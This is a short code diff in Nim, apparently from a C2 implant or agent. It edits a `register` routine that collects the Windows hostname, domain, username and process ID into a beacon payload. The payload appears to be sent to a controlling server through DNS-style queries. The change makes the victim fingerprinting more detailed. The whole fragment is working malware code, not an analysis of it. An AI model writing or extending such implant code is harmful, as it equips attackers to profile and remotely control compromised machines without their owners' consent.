@@ -227,13 +227,16 @@ proc query(t: AgentTransport; qname: string): string =
   txQuery(t.server, qname)
 
 proc register*(t: var AgentTransport): bool =
-  let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN")
+  let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN").toLowerAscii()
   let pid      = int(GetCurrentProcessId())
   t.agentId    = fmt"{fnv64(hostname & $pid):016x}"
+  let regDom   = getEnvStr("USERDOMAIN", "")
+  let regUsr   = getEnvStr("USERNAME", "UNKNOWN")
+  let username = if regDom.len > 0: regDom & "\\" & regUsr else: regUsr
 
   let payload = %*{
     "hostname": hostname,
-    "username": getEnvStr("USERNAME", "UNKNOWN"),
+    "username": username,
     "os":       "windows/amd64",
     "pid":      pid,
     "aes_key":  "",
